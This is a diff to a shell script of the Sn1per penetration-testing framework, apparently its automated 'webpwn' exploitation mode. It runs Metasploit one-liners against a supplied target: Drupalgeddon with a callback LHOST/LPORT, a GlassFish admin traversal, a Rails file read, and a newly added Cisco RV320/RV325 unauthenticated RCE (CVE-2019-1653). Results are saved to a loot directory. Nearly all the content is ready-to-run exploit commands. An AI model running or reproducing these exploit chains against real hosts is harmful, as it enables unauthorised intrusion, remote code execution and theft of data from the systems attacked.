@@ -1,5 +1,6 @@
       if [[ "$SLACK_NOTIFICATIONS" == "1" ]]; then
             /bin/bash "$INSTALL_DIR/bin/slack.sh" "[xerosecurity.com] •?((¯°·._.• Started Sn1per webpwn scan: $TARGET [$MODE] (`date +"%Y-%m-%d %H:%M"`) •._.·°¯))؟•"
+            echo "[xerosecurity.com] •?((¯°·._.• Started Sn1per webpwn scan: $TARGET [$MODE] (`date +"%Y-%m-%d %H:%M"`) •._.·°¯))؟•" >> $LOOT_DIR/scans/notifications.txt
       fi
       echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
       echo -e "$OKRED RUNNING JBOSS VULN SCANNER $RESET"
@@ -85,12 +86,12 @@
       msfconsole -q -x "use exploit/multi/http/drupal_drupageddon; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; setg URI /drupal/; setg TARGETURI /drupal/; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupageddon.raw
       sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupageddon.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupageddon.txt 2> /dev/null
       rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupageddon.raw 2> /dev/null
-      echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
-      echo -e "$OKRED RUNNING MS15-034 HTTP.SYS MEMORY LEAK EXPLOIT $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
-      msfconsole -q -x "use scanner/http/ms15_034_http_sys_memory_dump; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-ms15_034_http_sys_memory_dump.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-ms15_034_http_sys_memory_dump.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-ms15_034_http_sys_memory_dump.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-ms15_034_http_sys_memory_dump.raw 2> /dev/null
+      #echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
+      #echo -e "$OKRED RUNNING MS15-034 HTTP.SYS MEMORY LEAK EXPLOIT $RESET"
+      #echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
+      #msfconsole -q -x "use scanner/http/ms15_034_http_sys_memory_dump; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-ms15_034_http_sys_memory_dump.raw
+      #sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-ms15_034_http_sys_memory_dump.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-ms15_034_http_sys_memory_dump.txt 2> /dev/null
+      #rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-ms15_034_http_sys_memory_dump.raw 2> /dev/null
       echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
       echo -e "$OKRED RUNNING GLASSFISH ADMIN TRAVERSAL EXPLOIT $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
@@ -227,7 +228,14 @@
       msfconsole -q -x "use auxiliary/gather/rails_doubletap_file_read; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-rails_doubletap_file_read.raw
       sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-rails_doubletap_file_read.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-rails_doubletap_file_read.txt 2> /dev/null
       rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-rails_doubletap_file_read.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
+      echo -e "$OKRED RUNNING CISCO RV320 AND RV325 UNAUTHENTICATED RCE EXPLOIT CVE-2019-1653 $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
+      msfconsole -q -x "use exploit/linux/http/cisco_rv32x_rce; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-cisco_rv32x_rce.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-cisco_rv32x_rce.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-cisco_rv32x_rce.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-cisco_rv32x_rce.raw 2> /dev/null
       if [[ "$SLACK_NOTIFICATIONS" == "1" ]]; then
             /bin/bash "$INSTALL_DIR/bin/slack.sh" "[xerosecurity.com] •?((¯°·._.• Finished Sn1per webpwn scan: $TARGET [$MODE] (`date +"%Y-%m-%d %H:%M"`) •._.·°¯))؟•"
+            echo "[xerosecurity.com] •?((¯°·._.• Finished Sn1per webpwn scan: $TARGET [$MODE] (`date +"%Y-%m-%d %H:%M"`) •._.·°¯))؟•" >> $LOOT_DIR/scans/notifications.txt
       fi
       
